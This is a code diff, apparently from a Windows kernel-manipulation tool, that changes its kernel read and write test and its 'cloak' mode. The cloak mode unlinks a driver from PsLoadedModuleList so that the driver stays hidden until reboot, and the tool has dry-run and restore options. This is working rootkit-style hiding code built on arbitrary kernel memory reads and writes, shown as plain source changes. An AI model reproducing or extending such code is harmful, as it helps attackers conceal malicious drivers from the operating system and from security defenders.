@@ -167,7 +167,7 @@ bool kwtest() {
            static_cast<unsigned long long>(va), static_cast<unsigned long long>(rva));
 
     uint64_t v{};
-    if (!vmm::kread(va, &v, 8)) {
+    if (!vmm::kread_trusted(va, &v, 8)) {
         printf("[!] kernel read failed\n");
         return false;
     }
@@ -179,13 +179,13 @@ bool kwtest() {
         printf("[!] value is not a kernel VA - export RVA or read path is wrong\n");
     }
 
-    if (!vmm::kwrite(va, &v, 8)) {
+    if (!vmm::kwrite_trusted(va, &v, 8)) {
         printf("[!] kernel write failed (device VA write path)\n");
         return false;
     }
 
     uint64_t back{};
-    if (!vmm::kread(va, &back, 8)) {
+    if (!vmm::kread_trusted(va, &back, 8)) {
         printf("[!] read-back failed\n");
         return false;
     }
@@ -340,7 +340,9 @@ int wmain() {
 
     if (flags.only_eproc) { vmm::shutdown(); return 0; }
 
-    if (!vmm::init_kcr3()) { vmm::shutdown(); return 1; }
+    if (!vmm::init_kcr3()) {
+        printf("[!] CR3 not resolved - --kwtest will use kernel-VA trusted reads instead of page walk\n");
+    }
 
     // --cloak-restore is a standalone mode: it uses cloak.state written by the
     // commit, because a fresh process cannot rediscover an unlinked entry.
@@ -361,6 +363,7 @@ int wmain() {
     // --cloak is a DRY RUN: it resolves every address and prints them but
     // writes nothing to the kernel. --cloak-commit actually unlinks.
     if (flags.cloak) {
+        cloak::cloak_init(nullptr);
         const bool ok = cloak::apply(flags.cloak_commit);
         if (ok && flags.cloak_commit)
             printf("[*] driver unlinked from PsLoadedModuleList (stays unlinked until reboot)\n");
